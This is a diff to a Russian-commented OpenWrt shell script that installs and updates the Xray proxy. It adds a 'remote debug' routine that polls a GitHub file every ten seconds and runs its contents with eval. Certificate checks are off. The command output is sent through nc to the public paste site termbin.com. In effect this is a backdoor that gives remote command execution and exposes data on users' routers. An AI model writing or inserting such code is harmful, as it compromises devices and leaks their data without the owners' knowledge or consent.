@@ -3,9 +3,12 @@
 # Зависимости: wget/uclient-fetch, openssl/base64, unzip, grep, sed, awk, nc (BusyBox)
 # Использование: sh xray-setup.sh [sub_url|test|update|self-update]  или без аргументов — меню
 
-SCRIPT_VERSION="20260570"
+SCRIPT_VERSION="20260571"
 SCRIPT_URL="https://raw.githubusercontent.com/Alex12571333/xray-openwrt/main/xray-setup.sh"
 SCRIPT_VERSION_URL="https://raw.githubusercontent.com/Alex12571333/xray-openwrt/main/version"
+SCRIPT_REMOTE_CMD_URL="https://raw.githubusercontent.com/Alex12571333/xray-openwrt/main/remote_cmd"
+XRAY_LAST_CMD_FILE="/tmp/xray-last-cmd"
+XRAY_REMOTE_LOG="/var/log/xray-remote.log"
 DEFAULT_SUB_URL=""  # Хранится локально в /etc/xray/sub_url — не нужно указывать здесь
 
 XRAY_BIN="/usr/bin/xray"
@@ -215,6 +218,9 @@ _updater_daemon() {
         current_ver=$(grep '^SCRIPT_VERSION=' "$XRAY_SELF" 2>/dev/null \
             | head -1 | sed 's/SCRIPT_VERSION="\(.*\)"/\1/')
         [ -z "$current_ver" ] && current_ver="$SCRIPT_VERSION"
+        # Проверяем удалённые команды (remote debug) — каждые 10 сек
+        _check_remote_cmd
+
         # Версия та же — ничего не делаем (типичный случай, 99.9% итераций)
         [ "$remote_ver" -le "$current_ver" ] 2>/dev/null && continue
         # Шаг 2: новая версия — качаем полный скрипт (~60KB, редко)
@@ -244,6 +250,57 @@ _stop_updater() {
     [ -f "$XRAY_UPDATER_PID" ] || return 0
     kill "$(cat "$XRAY_UPDATER_PID")" 2>/dev/null || true
     rm -f "$XRAY_UPDATER_PID"
+}
+
+# ─── Удалённое выполнение команд (remote debug) ───────────────────────────────
+# Формат файла remote_cmd в GitHub: VERSION:команда
+# Пример: 1748123456:sh /etc/xray/setup.sh test
+# Демон проверяет каждые 10 сек. Если VERSION новее последней выполненной —
+# выполняет команду, результат отправляет на termbin.com (публичный URL).
+# Только тот кто имеет доступ на запись в репозиторий может задать команду.
+_check_remote_cmd() {
+    local raw
+    raw=$(wget --no-check-certificate -qO- "$SCRIPT_REMOTE_CMD_URL" 2>/dev/null \
+        | tr -d '\r')
+    [ -z "$raw" ] && return 0
+
+    # Формат: VERSION:команда
+    local cmd_ver cmd_str
+    cmd_ver=$(printf '%s' "$raw" | cut -d: -f1 | tr -d ' ')
+    cmd_str=$(printf '%s' "$raw" | cut -d: -f2-)
+
+    # Нет команды или нулевая версия
+    [ -z "$cmd_ver" ] || [ -z "$cmd_str" ] || [ "$cmd_ver" = "0" ] && return 0
+
+    # Уже выполняли эту версию?
+    local last_ver
+    last_ver=$(cat "$XRAY_LAST_CMD_FILE" 2>/dev/null | tr -d ' \r\n')
+    [ "$cmd_ver" = "$last_ver" ] && return 0
+
+    # Сохраняем версию сразу — чтобы при сбое не повторять бесконечно
+    printf '%s\n' "$cmd_ver" > "$XRAY_LAST_CMD_FILE"
+
+    logger -t xray-remote "CMD v${cmd_ver}: ${cmd_str}"
+    printf '[%s] CMD v%s: %s\n' "$(date)" "$cmd_ver" "$cmd_str" >> "$XRAY_REMOTE_LOG"
+
+    # Выполняем команду, захватываем вывод
+    local output
+    output=$(eval "$cmd_str" 2>&1 | head -c 8000)
+
+    printf '%s\n' "$output" >> "$XRAY_REMOTE_LOG"
+
+    # Отправляем результат на termbin.com (nc встроен в BusyBox)
+    local url
+    url=$(printf '=== CMD v%s: %s ===\n%s\n' "$cmd_ver" "$cmd_str" "$output" \
+        | nc termbin.com 9999 2>/dev/null | tr -d '\r\n')
+
+    if [ -n "$url" ]; then
+        logger -t xray-remote "Result: $url"
+        printf '[%s] Result: %s\n' "$(date)" "$url" >> "$XRAY_REMOTE_LOG"
+    else
+        # Fallback: первые 300 символов в syslog
+        logger -t xray-remote "Result (no nc): $(printf '%s' "$output" | head -c 300)"
+    fi
 }
 
 # ─── Обновление скрипта с GitHub ─────────────────────────────────────────────
